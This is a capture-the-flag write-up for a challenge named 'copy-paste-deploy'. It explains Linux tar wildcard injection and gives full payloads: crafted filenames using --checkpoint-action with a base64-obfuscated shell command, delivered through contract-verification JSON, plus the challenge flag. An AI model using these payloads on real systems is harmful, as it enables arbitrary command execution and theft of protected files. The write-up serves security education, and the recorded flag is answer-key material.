# copy-paste-deploy

In this CTF challenge, we explore a scenario in which a simple “deploy-and-verify” setup conceals a privilege escalation opportunity via Linux wildcard usage in `tar`. Much like how seemingly standard ERC1155 callbacks led to reentrancy exploits in other DeFi protocols, here we see how ordinary file operations combined with a system’s periodic tar archival can lead to a significant security breach.

---

## Challenge Overview

The challenge, titled **copy-paste-deploy**, centers on a scenario where you have access to a server that:

1. Periodically archives files in a `log` folder with `tar`.
2. Allows you to drop files (with arbitrary filenames) into that `log` folder.
3. Uses wildcard patterns (`*`) when performing the tar command.

By leveraging the well-known Linux wildcard-with-tar exploit, you can escalate privileges or exfiltrate files you would normally have no permission to access. In this setup, your ultimate goal is to copy the `flag.txt` file (located outside your accessible directory) into a public-facing location (`../public/verify.html`).

### Intended Outcome

By combining the wildcard exploit with precisely crafted filenames, you can trick the system’s periodic `tar` command into executing a malicious shell script. This shell script then performs critical file operations (for instance, `cp ../flag.txt ../public/verify.html`) to reveal the challenge’s flag.

---

## System Analysis

### The File Archiving Process

1. **Automatic Archival**  
   A server script periodically runs a command similar to:
   ```bash
   tar -cvf logs.tar log/*
   ```
   Because the command uses a wildcard (`*`) within the `log` folder, malicious filenames within `log/` can alter the behavior of the `tar` command.

2. **Wildcard Injection**  
   By placing specially named files into the `log` folder, an attacker can trick `tar` into interpreting them as flags/options or script commands to be executed. For instance, a file named:
   ```
   --checkpoint-action=exec=sh -c "COMMAND"
   ```
   can cause `tar` to run arbitrary shell commands once it hits a “checkpoint” in the archiving process.

3. **Privileges**  
   While it’s not guaranteed that the archiving script runs as `root`, it may still run with higher privileges or have access to directories (like `../`) that a low-privileged user does not. Thus, we can abuse that to copy a sensitive file (like `../flag.txt`) into a publicly accessible location.

### The Deploy and Verify Contracts

The challenge also provides multiple code snippets for deploying and verifying Solidity smart contracts:

```bash
forge create --rpc-url $RPC_URL --private-key 0xac... \
  ./src/Counter.sol:Counter

forge create --rpc-url $RPC_URL --private-key 0xac... \
  ./src/Counter.sol:Counter2

forge create --rpc-url $RPC_URL --private-key 0xac... \
  ./src/Counter.sol:Counter3


Upload this json when verifying the contract: 
{"language":"Solidity","sources":{"--checkpoint-action=exec=sh -c \"echo Y3AgLi4vZmxhZy50eHQgLi4vcHVibGljL3ZlcmlmeS5odG1sCg==|base64 -d|sh\"":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Counter {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\n    }\n}\n\ncontract Counter2 {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\n    }\n}\n\ncontract Counter3 {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\n    }\n}\n"}},"settings":{"remappings":["forge-std/=lib/forge-std/src/"],"optimizer":{"enabled":true,"runs":200},"metadata":{"useLiteralContent":false,"bytecodeHash":"ipfs","appendCBOR":true},"outputSelection":{"*":{"*":["abi","evm.bytecode","evm.deployedBytecode","evm.methodIdentifiers","metadata"]}},"evmVersion":"paris","viaIR":false,"libraries":{}}}
```

While these commands might seem unrelated at first glance, they serve as a decoy. The real vulnerability lies not in the solidity code itself but rather in how you can manipulate the contract's filename.

---

## The Vulnerability

The core vulnerability stems from **Linux tar wildcard injection**. When `tar` is invoked with a command such as:
```bash
tar -cvf logs.tar log/*
```
it will interpret any files in `log/` that start with a hyphen (`-`) as command-line options. Even more dangerous is if you pass special flags like `--checkpoint` or `--checkpoint-action`, which can instruct `tar` to run arbitrary commands at each checkpoint. This can be used to:

1. **Execute arbitrary shell commands**  
2. **Copy protected files**  
3. **Escalate privileges** if the process is running as a more privileged user

In this particular challenge, the ultimate malicious command is:
```bash
cp ../flag.txt ../public/verify.html
```
which exfiltrates the flag to a public location.

---

## The Exploit

### Exploit Setup

1. **Access to the `log` Folder**  
   You have write permissions to `log/` and know that the server periodically runs `tar -cvf logs.tar log/*`.

2. **Malicious Filenames**  
   To trigger the exploit, you create two files in `log/`:
   - `--checkpoint=1`
   - `--checkpoint-action=exec=sh -c "echo Y3AgLi4vZmxhZy50eHQgLi4vcHVibGljL3ZlcmlmeS5odG1sCg==|base64 -d|sh"`

   The base64-decoded command simply runs:
   ```bash
   cp ../flag.txt ../public/verify.html
   ```
   A real attacker might skip base64 encoding entirely and just pass the raw shell command, but encoding can help obfuscate the payload or handle tricky characters.

3. **Trigger the Archive**  
   When the server next runs `tar -cvf logs.tar log/*`, it interprets these specially named files as options:
   - `--checkpoint=1` instructs `tar` to run an action after the first checkpoint.
   - `--checkpoint-action=exec=sh -c "..."` executes the shell command at that checkpoint.

### Why It Works

1. **Tar’s Wildcard Handling**  
   `tar` sees `-` at the start of the file name and treats it as an argument rather than a normal file name.  
2. **Default Checkpoints**  
   `tar` supports checkpoint actions, which run commands after a certain number of processed files.  
3. **Privilege / File Path**  
   Because the script is presumably run by a user that has access to `../flag.txt`, the malicious command can copy the file to `../public/verify.html`, making it accessible to the attacker.

---

## Complete Solution Walkthrough

1. **Initial Setup**  
   - Gain the ability to write into the `log` folder on the remote machine.
   - Confirm `tar -cvf logs.tar log/*` is periodically executed by an automated script or cron job.

2. **Create the Malicious Files**  
   - Verify the contract with the malicious name to store them to the `log/` folder,:
```bash
{"language":"Solidity","sources":{"--checkpoint-action=exec=sh -c \"echo Y3AgLi4vZmxhZy50eHQgLi4vcHVibGljL3ZlcmlmeS5odG1sCg==|base64 -d|sh\"":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Counter {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\n    }\n}\n\ncontract Counter2 {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\n    }\n}\n\ncontract Counter3 {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\n    }\n}\n"}},"settings":{"remappings":["forge-std/=lib/forge-std/src/"],"optimizer":{"enabled":true,"runs":200},"metadata":{"useLiteralContent":false,"bytecodeHash":"ipfs","appendCBOR":true},"outputSelection":{"*":{"*":["abi","evm.bytecode","evm.deployedBytecode","evm.methodIdentifiers","metadata"]}},"evmVersion":"paris","viaIR":false,"libraries":{}}}

{"language":"Solidity","sources":{"--checkpoint=1":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Counter {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\n    }\n}\n\ncontract Counter2 {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\n    }\n}\n\ncontract Counter3 {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\nnumber++;\n    }\n}\n"}},"settings":{"remappings":["forge-std/=lib/forge-std/src/"],"optimizer":{"enabled":true,"runs":200},"metadata":{"useLiteralContent":false,"bytecodeHash":"ipfs","appendCBOR":true},"outputSelection":{"*":{"*":["abi","evm.bytecode","evm.deployedBytecode","evm.methodIdentifiers","metadata"]}},"evmVersion":"paris","viaIR":false,"libraries":{}}}

{"language":"Solidity","sources":{"src/Counter.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Counter {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\n    }\n}\n\ncontract Counter2 {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\n    }\n}\n\ncontract Counter3 {\n    uint256 public number;\n    function setNumber(uint256 newNumber) public {\n    }\n\n    function increment() public {\nnumber++;\nnumber++;\n    }\n}\n"}},"settings":{"remappings":["forge-std/=lib/forge-std/src/"],"optimizer":{"enabled":true,"runs":200},"metadata":{"useLiteralContent":false,"bytecodeHash":"ipfs","appendCBOR":true},"outputSelection":{"*":{"*":["abi","evm.bytecode","evm.deployedBytecode","evm.methodIdentifiers","metadata"]}},"evmVersion":"paris","viaIR":false,"libraries":{}}}

```

3. **Wait for the Tar Command**  
   - The next time the system runs its archive script, it processes these specially named files as arguments.
   - The checkpoint action triggers, executing:
     ```bash
     cp ../flag.txt ../public/verify.html
     ```
   - The flag is now available at `../public/verify.html`.

4. **Retrieve the Flag**  
   - Simply visit the `verify.html` page or open the file locally to view the contents of `flag.txt`.

---

## Key Takeaways

- **Beware of Wildcards with Sensitive Commands**  
   Always validate or sanitize filenames before using them in commands like `tar`, `zip`, or `cp`. Files that begin with a dash can be interpreted as flags rather than filenames.

---

This challenge reminds us that sometimes the biggest vulnerabilities do not stem from “obvious” application logic. Instead, they hide in the mundane corners of a system—like how tar commands handle filenames. Just as ERC1155 callbacks in a DeFi protocol can unexpectedly bypass important safety checks, Linux wildcard expansions can slip past standard security precautions unless properly restricted or sanitized.

- flag: **rctf{r31nv3nt1ng_th3_wh33l_@lw@ys_g0es_f!ne_fd886bc7cd0eb8c0c7137bbb}**
